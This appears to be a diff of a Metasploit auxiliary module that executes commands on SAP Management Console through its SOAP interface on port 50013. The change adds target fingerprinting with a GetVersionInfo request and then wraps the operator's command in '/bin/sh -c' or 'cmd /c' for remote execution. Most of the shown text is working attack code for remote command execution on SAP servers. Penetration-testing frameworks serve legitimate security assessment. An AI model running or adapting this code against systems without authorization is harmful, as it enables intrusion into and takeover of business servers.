@@ -42,7 +42,6 @@ class Metasploit4 < Msf::Auxiliary
 				OptString.new('USERNAME', [true, 'Username to use', '']),
 				OptString.new('PASSWORD', [true, 'Password to use', '']),
 				OptString.new('CMD', [true, 'Command to run', 'set']),
-				OptBool.new('UseWindows', [false, 'Use Windows syntax for command "cmd /c"', true]),
 			], self.class)
 		register_autofilter_ports([ 50013 ])
 	end
@@ -52,30 +51,71 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-		res = send_request_cgi({
-			'uri'     => "/#{datastore['URI']}",
-			'method'  => 'GET',
-			'headers' => {'User-Agent' => datastore['UserAgent']}
-		}, 25)
+		# Check version information to confirm Win/Lin
+
+		soapenv='http://schemas.xmlsoap.org/soap/envelope/'
+		xsi='http://www.w3.org/2001/XMLSchema-instance'
+		xs='http://www.w3.org/2001/XMLSchema'
+		sapsess='http://www.sap.com/webas/630/soap/features/session/'
+		ns1='ns1:GetVersionInfo' # Using GetVersionInfo to enumerate target type
+
+		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
+		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' +	 soapenv
+		data << '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
+		data << '<SOAP-ENV:Header>' + "\r\n"
+		data << '<sapsess:Session xlmns:sapsess="' +  sapsess + '">' + "\r\n"
+		data << '<enableSession>true</enableSession>' + "\r\n"
+		data << '</sapsess:Session>' + "\r\n"
+		data << '</SOAP-ENV:Header>' + "\r\n"
+		data << '<SOAP-ENV:Body>' + "\r\n"
+		data << '<'+ ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 +'>' + "\r\n"
+		data << '</SOAP-ENV:Body>' + "\r\n"
+		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
+
+		print_status("[SAP] Attempting to enumerate remote host type")
+
+		begin
+			res = send_request_raw({
+				'uri'     => "/#{datastore['URI']}",
+				'method'  => 'POST',
+				'data'    => data,
+				'headers' =>
+					{
+						'Content-Length'  => data.length,
+						'SOAPAction'      => '""',
+						'Content-Type'    => 'text/xml; charset=UTF-8',
+					}
+			}, 60)
+
+		rescue ::Rex::ConnectionError
+			print_error("#{rhost}:#{rport} [SAP] Unable to communicate")
+			return :abort
+		end
 
 		if not res
 			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
 			return
+		elsif res.code == 200
+			body = res.body
+			if body.match(/linux/i)
+				print_status("[SAP] Linux target detected")
+				cmd_to_run = '/bin/sh -c ' + datastore['CMD']
+			elsif body.match(/NT/)
+				print_status("[SAP] Windows target detected")
+				cmd_to_run = 'cmd /c ' + datastore['CMD']
+			else
+				print_status("[SAP] Unknown target detected, defaulting to *nix syntax")
+				cmd_to_run = '/bin/sh -c ' + datastore['CMD']
+			end
 		end
 
-		osexecute(ip)
+		osexecute(ip, cmd_to_run)
 	end
 
-	def osexecute(rhost)
+	def osexecute(rhost, cmd_to_run)
 
 		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
 		success = false
-
-		if datastore['UseWindows']
-			cmd_to_run = 'cmd /c ' + datastore['CMD']
-		else
-			cmd_to_run = datastore['CMD']
-		end
 
 		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
 		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
